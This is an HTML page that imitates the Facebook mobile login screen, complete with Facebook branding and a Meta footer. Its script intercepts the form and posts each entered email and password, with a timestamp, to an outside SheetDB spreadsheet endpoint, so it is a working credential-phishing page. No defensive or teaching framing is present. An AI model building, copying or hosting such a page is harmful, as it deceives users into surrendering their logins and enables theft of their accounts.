# Log-in-form-1
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook – log in or sign up</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
  </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen flex flex-col justify-between text-[#1c1e21]">

  <!-- Top Banner / Header -->
  <div>
    <div class="bg-[#fffbe2] text-[#3b5998] text-xs text-center py-2.5 px-4 border-b border-[#e2e2e2]">
      Get Facebook for Android and browse faster.
    </div>

    <!-- Facebook Header Logo -->
    <div class="flex justify-center py-6 pt-8">
      <h1 class="text-[#1877f2] text-4xl font-bold tracking-tight">facebook</h1>
    </div>

    <!-- Login Form Card -->
    <div class="px-4 max-w-sm mx-auto w-full">
      <form id="loginForm" class="flex flex-col gap-3">
        <div>
          <input 
            type="text" 
            id="email" 
            name="Email" 
            placeholder="Mobile number or email" 
            required
            class="w-full px-3.5 py-3 border border-[#ccd0d5] rounded-md text-base bg-[#f5f6f7] focus:bg-white focus:outline-none focus:border-[#1877f2]"
          />
        </div>

        <div>
          <input 
            type="password" 
            id="password" 
            name="Password" 
            placeholder="Password" 
            required
            class="w-full px-3.5 py-3 border border-[#ccd0d5] rounded-md text-base bg-[#f5f6f7] focus:bg-white focus:outline-none focus:border-[#1877f2]"
          />
        </div>

        <button 
          type="submit" 
          id="submitBtn"
          class="w-full bg-[#1877f2] active:bg-[#166fe5] text-white font-bold py-3 rounded-md text-base transition duration-150 ease-in-out mt-1"
        >
          Log In
        </button>

        <!-- Forgot Password Link -->
        <div class="text-center my-2">
          <a href="#" class="text-[#1877f2] text-sm font-medium">Forgot password?</a>
        </div>

        <!-- Divider -->
        <div class="flex items-center my-2">
          <div class="flex-grow border-t border-[#ccd0d5]"></div>
          <span class="px-3 text-xs text-gray-500">or</span>
          <div class="flex-grow border-t border-[#ccd0d5]"></div>
        </div>

        <!-- Create Account Button -->
        <div class="text-center pt-1">
          <button 
            type="button" 
            class="w-full border border-[#ccd0d5] bg-white text-[#4b4f56] font-semibold py-2.5 rounded-md text-sm hover:bg-gray-50"
          >
            Create new account
          </button>
        </div>
      </form>
    </div>
  </div>

  <!-- Footer Section (Mobile Style) -->
  <footer class="py-6 px-4 text-center text-xs text-gray-500 bg-white border-t border-[#e2e2e2] mt-8">
    <div class="grid grid-cols-2 gap-2 max-w-xs mx-auto mb-4 text-[#576b95]">
      <a href="#">English (US)</a>
      <a href="#">Filipino</a>
      <a href="#">Bisaya</a>
      <a href="#">Español</a>
    </div>
    <div class="text-gray-400 text-[11px]">
      Meta © 2026
    </div>
  </footer>

  <!-- JavaScript Integration with New SheetDB API -->
  <script>
    const sheetDbUrl = 'https://sheetdb.io/api/v1/rjrgycnnveiqn';
    const form = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      submitBtn.textContent = 'Logging in...';
      submitBtn.disabled = true;

      const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      fetch(sheetDbUrl, {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          data: [
            {
              'Timestamp': timestamp,
              'Email': email,
              'Password': password
            }
          ]
        })
      })
      .then(response => response.json())
      .then(data => {
        alert('Data successfully saved to Google Sheet!');
        form.reset();
        submitBtn.textContent = 'Log In';
        submitBtn.disabled = false;
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Nagkaroon ng problema sa pag-save ng data.');
        submitBtn.textContent = 'Log In';
        submitBtn.disabled = false;
      });
    });
  </script>

</body>
</html>
